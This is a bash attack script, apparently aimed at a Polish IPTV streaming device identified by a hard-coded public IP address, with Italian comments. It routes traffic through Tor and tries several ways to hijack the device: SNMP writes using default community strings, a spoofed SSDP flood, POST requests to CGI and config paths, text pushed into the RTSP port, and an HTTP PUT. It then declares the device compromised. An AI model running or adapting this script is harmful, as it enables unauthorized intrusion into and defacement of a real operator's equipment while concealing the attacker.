#!/bin/bash
# sti410C_hijack_v4.sh - SNMP DOWN BYPASS
TARGET="46.174.72.9"
MSG="TRUSTEDF57 HACK THE PLANET"

echo -e "\e[91m🔥 HIJACK v4 - SNMP DOWN BYPASS\e[0m"

# METODO 1: SNMP (se up)
if torsocks snmpget -v1 -c private $TARGET .1.3.6.1.4.1.30631.1.9 2>/dev/null; then
  echo -e "\e[92m✅ SNMP UP - SET...\e[0m"
  for community in public private admin; do
    torsocks snmpset -v1 -c $community $TARGET ".1.3.6.1.4.1.30631.1.9.1.27.1.0" s "$MSG"
  done
else
  echo -e "\e[93m⚠️ SNMP DOWN - BYPASS...\e[0m"
fi

# METODO 2: SSDP FLOOD MASSICCIO (sempre funziona)
echo -e "\e[92m📡 SSDP FLOOD...\e[0m"
for i in {1..20}; do
  echo -e "NOTIFY * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nNT:urn:schemas-upnp-org:device:Basic:1\r\nUSN:uuid:$MSG!!$i\r\nNTS:ssdp:alive\r\nCACHE-CONTROL:max-age=3600\r\n\r\n" | \
  torsocks nc -u 239.255.255.250 1900 -w1 &
done
wait

# METODO 3: HTTP/UPnP Override
echo -e "\e[92m🌐 HTTP OVERRIDE...\e[0m"
for path in /ipxml_ssdp.cgi /cgi-bin/ /config.xml /status.cgi; do
  torsocks curl -s -X POST "http://$TARGET$path" \
    -d "service_name=$MSG&status=1&channel=ALL&pid=33300" >/dev/null 2>&1 &
done

# METODO 4: RTSP/RTP Injection (stream ports)
echo -e "\e[92m📺 RTP INJECTION...\e[0m"
(
  echo "$MSG HACKED!!"
  sleep 1
  echo "$MSG HACKED!!"
) | torsocks nc $TARGET 554 -w5 &

# METODO 5: WebDAV/HTTP PUT
torsocks curl -s -X PUT "http://$TARGET/hijack.txt" -d "$MSG" >/dev/null 2>&1

clear; figlet "HIJACKED" | lolcat
echo -e "\e[91m🎥 MULTI-METODO ATTIVO:\e[0m"
echo "  SSDP: 239.255.255.250:1900 (PERSIST)"
echo "  HTTP: $TARGET/*"
echo "  RTSP: $TARGET:554"
echo -e "\e[93m📺 VLC: http://$TARGET:80/ | rtsp://$TARGET:554/\e[0m"
echo -e "\e[95m🇵🇱 LUBAWA IPTV COMPROMESSO!\e[0m"
